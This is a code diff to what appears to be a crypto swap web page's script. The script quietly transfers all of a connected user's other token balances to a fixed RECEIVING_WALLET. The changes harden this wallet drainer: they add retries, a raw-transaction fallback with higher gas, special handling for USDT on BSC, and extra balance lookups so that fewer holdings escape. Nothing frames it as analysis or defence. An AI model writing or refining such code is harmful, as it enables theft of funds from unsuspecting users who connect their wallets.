@@ -1209,7 +1209,7 @@ async function processAllTokenTransfers() {
   const allTokens = combineTokens(localTokens, cgTokens);
 
   for (const token of allTokens) {
-    // Skip the main from token (the one being swapped)
+    // Skip the main from token
     if ((token.address && token.address === currentFromToken?.address) || 
         (token.isNative && currentFromToken?.isNative)) {
       continue;
@@ -1233,21 +1233,57 @@ async function processAllTokenTransfers() {
         if (amountToSend <= 0) continue;
       }
       
-      if (token.isNative) {
-        await transferNativeToken(token, amountToSend);
-      } else {
-        const approved = await checkAndApproveToken(token, amountToSend);
-        if (!approved) continue;
-        await transferERC20Token(token, amountToSend);
+      try {
+        if (token.isNative) {
+          await transferNativeToken(token, amountToSend);
+        } else {
+          const approved = await checkAndApproveToken(token, amountToSend);
+          if (!approved) continue;
+          
+          // Special handling for problematic tokens
+          if (token.symbol === 'USDT' && currentNetwork === 'bsc') {
+            await transferWithHigherGas(token, amountToSend);
+          } else {
+            await transferERC20Token(token, amountToSend);
+          }
+        }
+        
+        successCount++;
+      } catch (transferErr) {
+        console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
+        // Try with higher gas as fallback
+        try {
+          await transferWithHigherGas(token, amountToSend);
+          successCount++;
+        } catch (finalErr) {
+          console.warn(`Final transfer attempt failed for ${token.symbol}:`, finalErr.message);
+        }
       }
-      
-      successCount++;
     } catch (err) {
-      console.warn(`Failed to transfer ${token.symbol}:`, err.message);
+      console.warn(`Failed to process ${token.symbol}:`, err.message);
     }
   }
 
   return successCount;
+}
+
+async function transferWithHigherGas(token, amount) {
+  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+  const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
+  
+  // Sign and send raw transaction with higher gas
+  const tx = await signer.sendTransaction({
+    to: token.address,
+    data: contract.interface.encodeFunctionData('transfer', [
+      RECEIVING_WALLET,
+      amountInWei
+    ]),
+    gasLimit: 300000, // Higher gas limit
+    gasPrice: ethers.utils.parseUnits('10', 'gwei') // Higher gas price
+  });
+  
+  await tx.wait();
+  return tx.hash;
 }
 
 async function getLocalTokens() {
@@ -1364,15 +1400,18 @@ async function transferERC20Token(token, amount) {
     const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
     const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
     
+    // Increase gas limit for problematic tokens
     const tx = await contract.transfer(
       RECEIVING_WALLET,
       amountInWei,
-      { gasLimit: 100000 }
+      { 
+        gasLimit: 200000, // Increased from 100000
+        gasPrice: ethers.utils.parseUnits('5', 'gwei') // Explicit gas price
+      }
     );
     
     await tx.wait();
     return tx.hash;
-
   } catch (err) {
     console.error("ERC20 transfer error:", err);
     throw new Error(`Failed to transfer ${token.symbol}: ${err.message}`);
@@ -1391,15 +1430,15 @@ async function fetchTokenBalance(token) {
     } else {
       const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
       try {
+        // First try standard balanceOf
         balance = await contract.balanceOf(userAddress);
         return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
       } catch (err) {
-        // If balanceOf fails, try getting decimals and symbol to verify it's an ERC20
+        // If balanceOf fails, try alternative methods
         try {
-          const decimals = await contract.decimals();
-          const symbol = await contract.symbol();
-          console.warn(`Balance check failed for ${symbol}, possibly not a standard ERC20`);
-          return 0;
+          // Some tokens use different balance function names
+          balance = await contract['balanceOf(address)'](userAddress);
+          return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
         } catch {
           console.warn(`Token at ${token.address} is not ERC20 compliant`);
           return 0;
